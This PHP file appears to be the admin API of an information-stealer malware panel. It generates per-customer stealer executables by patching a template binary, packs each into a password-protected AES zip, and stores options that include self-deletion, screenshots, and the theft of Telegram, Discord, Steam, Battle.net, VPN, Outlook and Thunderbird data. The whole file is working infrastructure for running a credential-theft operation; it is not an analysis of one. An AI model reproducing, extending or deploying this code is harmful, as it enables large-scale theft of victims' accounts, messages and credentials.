<?php

include_once "../../config.php";
include_once "../app/functions.php";
include_once "../app/managers/AccountManager.php";

session_start();
header('Content-Type: application/json; charset=utf-8');

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    echo json_encode(['error' => 'do not have permission to use this method']);
    exit();
}

$method                 = isset($_POST["method"]) ? $_POST["method"] : null;

$page                   = isset($_POST['page']) ? intval($_POST['page']) : 0;
$draw                   = isset($_POST['draw']) ? intval($_POST['draw']) : 0;
$start                  = isset($_POST['start']) ? intval($_POST['start']) : 0;
$length                 = isset($_POST['length']) ? intval($_POST['length']) : 10;

$build_id               = isset($_POST['build_id']) ? intval($_POST['build_id']) : 0;
$build_status           = isset($_POST['build_status']) ? intval($_POST['build_status']) : 0;

$name                   = isset($_POST["name"]) ? $_POST["name"] : null;
$self_delete            = isset($_POST['self_delete']) ? intval($_POST['self_delete']) : 0;
$take_screenshot        = isset($_POST['take_screenshot']) ? intval($_POST['take_screenshot']) : 0;
$block_hwid             = isset($_POST['block_hwid']) ? intval($_POST['block_hwid']) : 0;
$block_ips              = isset($_POST['block_ips']) ? intval($_POST['block_ips']) : 0;

$loader_before          = isset($_POST['loader_before']) ? intval($_POST['loader_before']) : 0;

$steal_telegram         = isset($_POST['steal_telegram']) ? intval($_POST['steal_telegram']) : 0;
$steal_discord          = isset($_POST['steal_discord']) ? intval($_POST['steal_discord']) : 0;
$steal_tox              = isset($_POST['steal_tox']) ? intval($_POST['steal_tox']) : 0;
$steal_pidgin           = isset($_POST['steal_pidgin']) ? intval($_POST['steal_pidgin']) : 0;

$steal_steam            = isset($_POST['steal_steam']) ? intval($_POST['steal_steam']) : 0;
$steal_battlenet        = isset($_POST['steal_battlenet']) ? intval($_POST['steal_battlenet']) : 0;
$steal_uplay            = isset($_POST['steal_uplay']) ? intval($_POST['steal_uplay']) : 0;

$steal_protonvpn        = isset($_POST['steal_protonvpn']) ? intval($_POST['steal_protonvpn']) : 0;
$steal_openvpn          = isset($_POST['steal_openvpn']) ? intval($_POST['steal_openvpn']) : 0;

$steal_outlook          = isset($_POST['steal_outlook']) ? intval($_POST['steal_outlook']) : 0;
$steal_thunderbird      = isset($_POST['steal_thunderbird']) ? intval($_POST['steal_thunderbird']) : 0;


if($method != null)
{
    switch($method)
    {
        case "get_builds":
            getBuilds();
            break;

        case "get_builds_list":
            getBuildsTable($page, $draw, $start, $length);
            break;

        case "change_status":
            ChangeStatus($build_id, $build_status);
            break;

        case "create_build":
            CreateBuild($name, $self_delete, $take_screenshot, $block_hwid, $block_ips, $loader_before, $steal_telegram, $steal_discord, $steal_tox, $steal_pidgin, $steal_steam, $steal_battlenet, $steal_uplay, $steal_protonvpn, $steal_openvpn, $steal_outlook, $steal_thunderbird);
            break;

        case "get_build":
            getBuild($build_id);
            break;

        case "edit_build":
            editBuild($build_id, $self_delete, $take_screenshot, $block_hwid, $block_ips, $loader_before, $steal_telegram, $steal_discord, $steal_tox, $steal_pidgin, $steal_steam, $steal_battlenet, $steal_uplay, $steal_protonvpn, $steal_openvpn, $steal_outlook, $steal_thunderbird);
            break;

        case "delete_build":
            DeleteBuild($build_id);
            break;

        case "rebuild_all":
            RebuildAll($link);
            break;

        default:
            echo json_encode(['error' => 'Unknown method']);
            exit(0);
            break;
    }
}

function getBuilds()
{
    $link = ConnectDB();

    $_builds = array();
    $builds = $link->query("SELECT name FROM builds;");
    
    while ($build = $builds->fetch_assoc())
    {
        $_builds[] = array(
            "id"   => $build['name'],
            "text" => $build['name'],
        );
    }

    echo json_encode($_builds);
    exit();
}

function getBuildsTable($page, $draw, $start, $length)
{
    $link = ConnectDB();
    
    $conditions = [];
    
    $whereClause = '';
    if (!empty($conditions)) {
        $whereClause = ' WHERE ' . implode(' AND ', $conditions);
    }
    
    $countQuery = "SELECT COUNT(*) AS total FROM `builds`" . $whereClause;
    $countResult = $link->query($countQuery);
    $totalRecords = 0;
    if ($countResult) {
        $row = $countResult->fetch_assoc();
        $totalRecords = (int)$row['total'];
    }
    
    $limitStart = $start;
    $limitCount = (int)$length;
    
    $query = "SELECT * FROM `builds`" . $whereClause . " ORDER BY `build_id` DESC LIMIT {$limitStart}, {$limitCount}";
    $result = $link->query($query);
    
    $data = [];
    while ($row = $result->fetch_assoc()) 
    {
        $data[] = [
            'build_id'              => $row['build_id'],
            'name'                  => $row['name'],
            'password'              => $row['password'],
            'version'               => $row['version'],
            'created_at'            => $row['created_at'],
            'last_compile'          => $row['last_compile'],
            'logs_count'            => $row['logs_count'],
            'active'                => $row['active']
        ];
    }
    
    $total_pages = ($limitCount > 0) ? ceil($totalRecords / $limitCount) : 0;
    
    $response = [
        "draw"            => $draw,
        "recordsTotal"    => $totalRecords,
        "recordsFiltered" => $totalRecords,
        "current_page"    => $page,
        "total_pages"     => $total_pages,
        "data"            => $data
    ];
    
    echo json_encode($response);
    exit();
}

function ChangeStatus($build_id, $build_status)
{
    $link = ConnectDB();
    
    if (empty($build_id) || !isset($build_status)) 
    {
        echo json_encode(['error' => 'No build_id or build_status provided']);
        exit();
    }
    
    $stmt = $link->prepare("UPDATE builds SET active = ? WHERE build_id = ?");
    
    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing UPDATE statement: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("ii", $build_status, $build_id);
    
    // Выполнение запроса
    if (!$stmt->execute()) 
    {
        echo json_encode(['error' => 'Error executing UPDATE: ' . $stmt->error]);
        exit();
    }
    
    if ($stmt->affected_rows === 0) 
    {
        echo json_encode(['error' => 'No build found with provided ID']);
        exit();
    }
    
    $stmt->close();
    
    echo json_encode(['success' => 'Build status updated']);
    exit();
}

function CreateBuild($name, $self_delete, $take_screenshot, $block_hwid, $block_ips, $loader_before, $steal_telegram, $steal_discord, $steal_tox, $steal_pidgin, $steal_steam, $steal_battlenet, $steal_uplay, $steal_protonvpn, $steal_openvpn, $steal_outlook, $steal_thunderbird)
{
    $link = ConnectDB();

    // get latest version
    $query = "SELECT * FROM versions ORDER BY CAST(SUBSTRING_INDEX(version, '.', 1) AS UNSIGNED) DESC, CAST(SUBSTRING_INDEX(SUBSTRING_INDEX(version, '.', 2), '.', -1) AS UNSIGNED) DESC, CAST(SUBSTRING_INDEX(version, '.', -1) AS UNSIGNED) DESC LIMIT 1";
    $result = mysqli_query($link, $query);
    
    if ($result && mysqli_num_rows($result) > 0)
    {
        $row                = mysqli_fetch_assoc($result);
        $zip_file           = $row['zip_file'];
        $version            = $row['version'];
        $build_path         = "../../../temp/". $name. ".exe";

        if(GenerateBuild($build_path, $name, $zip_file))
        {
            $password = generateRandomString(8);

            $zip = new ZipArchive;
            $archivePath = "../builds/$name.zip";

            if ($zip->open($archivePath, ZipArchive::CREATE) === TRUE) 
            {
                if ($zip->addFile($build_path, "$name.exe"))
                {
                    $zip->setPassword($password);

                    if (!$zip->setEncryptionName("$name.exe", ZipArchive::EM_AES_256)) 
                    {
                        echo json_encode(['error' => 'Error installing cryptography for build zip']);
                        exit();
                    }
                }
                else
                {
                    echo json_encode(['error' => 'Error adding build to zip']);
                    exit();
                }
            }
            else
            {
                echo json_encode(['error' => 'Error creating zip']);
                exit();
            }

            $zip->close();
            unlink($build_path);


            $sql = "INSERT INTO builds (name, password, version, self_delete, take_screenshot, block_hwid, block_ips, loader_before_grabber, steal_telegram, steal_discord, steal_tox, steal_pidgin, steal_steam, steal_battlenet, steal_uplay, steal_protonvpn, steal_openvpn, steal_outlook, steal_thunderbird, logs_count, created_at,last_compile,active) 
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, NOW(), NOW(), 1)";

            $stmt = $link->prepare($sql);
            if (!$stmt) 
            {
                echo json_encode(['error' => 'Error preparing INSERT: ' . $link->error]);
                exit();
            }

            $types = "sss" . str_repeat("i", 16);

            if (!$stmt->bind_param(
                $types,
                $name,
                $password,
                $version,
                $self_delete,
                $take_screenshot,
                $block_hwid, 
                $block_ips,
                $loader_before,
                $steal_telegram,
                $steal_discord, 
                $steal_tox,
                $steal_pidgin,
                $steal_steam,
                $steal_battlenet, 
                $steal_uplay,
                $steal_protonvpn, 
                $steal_openvpn,
                $steal_outlook,
                $steal_thunderbird 
            )) {
                echo json_encode(['error' => 'Error binding parameters: ' . $stmt->error]);
                exit();
            }

            if ($stmt->execute()) 
            {
                echo json_encode(['success' => 'Build created']);
            } 
            else 
            {
                echo json_encode(['error' => 'Error adding build: ' . $stmt->error]);
            }

            $stmt->close();
        }
        else
        {
            echo json_encode(['error' => 'Error generating new build']);
            exit();
        }
    }
    else
    {
        echo json_encode(['error' => 'Versions not found, check admin settings']);
        exit();
    }
}

function getBuild($build_id)
{
    $link = ConnectDB();

    $build_id = mysqli_real_escape_string($link, $build_id);

    $build = $link->query("SELECT * FROM `builds` WHERE `build_id`='$build_id'")->fetch_array();

    $data = [];

    if($build != null)
    {
        $data["build_id"]               = $build["build_id"];

        $data["name"]                   = $build["name"];
        $data["password"]               = $build["password"];
        $data["version"]                = $build["version"];

        $data["self_delete"]            = $build["self_delete"];
        $data["take_screenshot"]        = $build["take_screenshot"];
        $data["block_hwid"]             = $build["block_hwid"];
        $data["block_ips"]              = $build["block_ips"];

        $data["loader_before_grabber"]  = $build["loader_before_grabber"];

        $data["steal_telegram"]         = $build["steal_telegram"];
        $data["steal_discord"]          = $build["steal_discord"];
        $data["steal_tox"]              = $build["steal_tox"];
        $data["steal_pidgin"]           = $build["steal_pidgin"];

        $data["steal_steam"]            = $build["steal_steam"];
        $data["steal_battlenet"]        = $build["steal_battlenet"];
        $data["steal_uplay"]            = $build["steal_uplay"];

        $data["steal_protonvpn"]        = $build["steal_protonvpn"];
        $data["steal_openvpn"]          = $build["steal_openvpn"];

        $data["steal_outlook"]          = $build["steal_outlook"];
        $data["steal_thunderbird"]      = $build["steal_thunderbird"];

        $data["logs_count"]             = $build["logs_count"];
        $data["created_at"]             = $build["created_at"];
        $data["last_compile"]           = $build["last_compile"];
        $data["active"]                 = $build["active"];
    }
    else
    {
        echo json_encode(['error' => 'Build not found']);
        exit();
    }

    echo json_encode(['success' => true, 'data' => $data]);
}

function editBuild($build_id, $self_delete, $take_screenshot, $block_hwid, $block_ips, $loader_before, $steal_telegram, $steal_discord, $steal_tox, $steal_pidgin, $steal_steam, $steal_battlenet, $steal_uplay, $steal_protonvpn, $steal_openvpn, $steal_outlook, $steal_thunderbird)
{
    $link = ConnectDB();

    $stmt = $link->prepare("UPDATE `builds` SET 
        `self_delete` = ?, 
        `take_screenshot` = ?, 
        `block_hwid` = ?, 
        `block_ips` = ?, 
        `loader_before_grabber` = ?, 
        `steal_telegram` = ?, 
        `steal_discord` = ?, 
        `steal_tox` = ?, 
        `steal_pidgin` = ?, 
        `steal_steam` = ?, 
        `steal_battlenet` = ?, 
        `steal_uplay` = ?, 
        `steal_protonvpn` = ?, 
        `steal_openvpn` = ?, 
        `steal_outlook` = ?, 
        `steal_thunderbird` = ? 
        WHERE `build_id` = ?");
    
    if (!$stmt) {
        echo json_encode(['error' => 'Error preparing UPDATE: ' . $link->error]);
        exit();
    }

    // Bind parameters: assuming all flags and build_id are integers (0 or 1 for flags)
    $stmt->bind_param(
        "iiiiiiiiiiiiiiiii", 
        $self_delete, 
        $take_screenshot, 
        $block_hwid, 
        $block_ips, 
        $loader_before, 
        $steal_telegram, 
        $steal_discord, 
        $steal_tox, 
        $steal_pidgin, 
        $steal_steam, 
        $steal_battlenet, 
        $steal_uplay, 
        $steal_protonvpn, 
        $steal_openvpn, 
        $steal_outlook, 
        $steal_thunderbird, 
        $build_id
    );

    if ($stmt->execute()) {
        echo json_encode(['success' => 'Build updated successfully']);
    } else {
        echo json_encode(['error' => 'Error updating build: ' . $stmt->error]);
    }
    
    $stmt->close();
    exit();
}

function GenerateBuild($build_path, $build_tag, $zip_file)
{
    $placeholder        = 'default                    ';

    $version_archive    = "../updates/$zip_file";
    $zip = new ZipArchive;

    if ($zip->open($version_archive) === TRUE)
    {
        if ($zip->locateName("build.exe") !== false)
        {
            $contents = $zip->getFromName("build.exe");
            $zip->close();

            if ($contents !== false) 
            {
                file_put_contents($build_path, $contents);

                try
                {
                    if(replace_placeholder($build_path, $placeholder, $build_tag))
                    {


                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                catch (Exception $e)
                {
                        
                }

                return false;
            }
            else
            {
                return false;
            }
        }
        else
        {
            return false;
        }
    }
    else
    {
        return false;
    }
}

function replace_placeholder($build_path, $placeholder, $new_value) 
{
    $data = file_get_contents($build_path);

    if (strlen($new_value) > strlen($placeholder)) 
    {
        return false;
    }

    $new_value_padded = str_pad($new_value, strlen($placeholder), ' ');
    $data = str_replace($placeholder, $new_value_padded, $data);
    file_put_contents($build_path, $data);

    return true;
}

function DeleteBuild($build_id)
{
    $link = ConnectDB();

    $build_id = mysqli_real_escape_string($link, $build_id);
    $build = $link->query("SELECT * FROM `builds` WHERE `build_id`='$build_id'")->fetch_array();

    if($build != null)
    {
        $name = $build["name"];

        // delete zip
        if(unlink("../builds/$name.zip"))
        {
            // delete from db
            $stmt = $link->prepare("DELETE FROM builds WHERE build_id = ?");

            if (!$stmt)
            {
                echo json_encode(['error' => 'Error preparing DELETE: ' . $link->error]);
                exit();
            }
            
            $stmt->bind_param("i", $build_id);

            if (!$stmt->execute()) 
            {
                echo json_encode(['error' => 'Error executing DELETE: ' . $stmt->error]);
                exit();
            }
            
            if ($stmt->affected_rows === 0) 
            {
                echo json_encode(['error' => 'No build found with build_id']);
                exit();
            }
            
            $stmt->close();
            
            echo json_encode(['success' => 'Build deleted']);
            exit();
        }
        else
        {
            echo json_encode(['error' => 'Error deleting zip']);
            exit();
        }
    }
    else
    {
        echo json_encode(['error' => 'Build not found']);
        exit();
    }
}

function RebuildAll($link)
{
    $query = "SELECT * FROM versions ORDER BY CAST(SUBSTRING_INDEX(version, '.', 1) AS UNSIGNED) DESC, CAST(SUBSTRING_INDEX(SUBSTRING_INDEX(version, '.', 2), '.', -1) AS UNSIGNED) DESC, CAST(SUBSTRING_INDEX(version, '.', -1) AS UNSIGNED) DESC LIMIT 1";
    $result = mysqli_query($link, $query);

    if ($result && mysqli_num_rows($result) > 0)
    {
        $row                = mysqli_fetch_assoc($result);
        $zip_file           = $row['zip_file'];
        $version            = $row['version'];

        $builds = $link->query("SELECT * FROM builds;");

        while ($build = $builds->fetch_assoc())
        {
            $name               = $build["name"];
            $build_path         = "../../../temp/". $name. ".exe";

            if(GenerateBuild($build_path, $name, $zip_file))
            {
                $password = generateRandomString(8);

                $zip = new ZipArchive;
                $archivePath = "../builds/$name.zip";

                if ($zip->open($archivePath, ZipArchive::CREATE) === TRUE) 
                {
                    if ($zip->addFile($build_path, "$name.exe"))
                    {
                        $zip->setPassword($password);

                        if (!$zip->setEncryptionName("$name.exe", ZipArchive::EM_AES_256)) 
                        {
                            echo json_encode(['error' => 'Error installing cryptography for build zip']);
                            exit();
                        }
                    }
                    else
                    {
                        echo json_encode(['error' => 'Error adding build to zip']);
                        exit();
                    }
                }
                else
                {
                    echo json_encode(['error' => 'Error creating zip']);
                    exit();
                }

                $zip->close();
                unlink($build_path);

                UpdateBuildAfterRebuild($link, $build["build_id"], $version, $password);
            }
            else
            {
                echo json_encode(['error' => 'Error compiling build '. $name]);
                exit();
            }
        }

        echo json_encode(['success' => 'All Builds Updated']);
        exit();
    }
    else
    {
        echo json_encode(['error' => 'Versions not found, check admin settings']);
        exit();
    }
}

function UpdateBuildAfterRebuild($link, $build_id, $version, $password)
{
    $stmt = $link->prepare("UPDATE `builds` SET `last_compile` = NOW(), `version` = ?, `password` = ? WHERE `build_id` = ?");
    
    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing UPDATE: ' . $link->error]);
        exit();
    }

    $stmt->bind_param(
        "ssi", 
        $version, 
        $password, 
        $build_id
    );

    if (!$stmt->execute()) 
    {
        return false;
    }
    
    $stmt->close();
    return true;
}

?>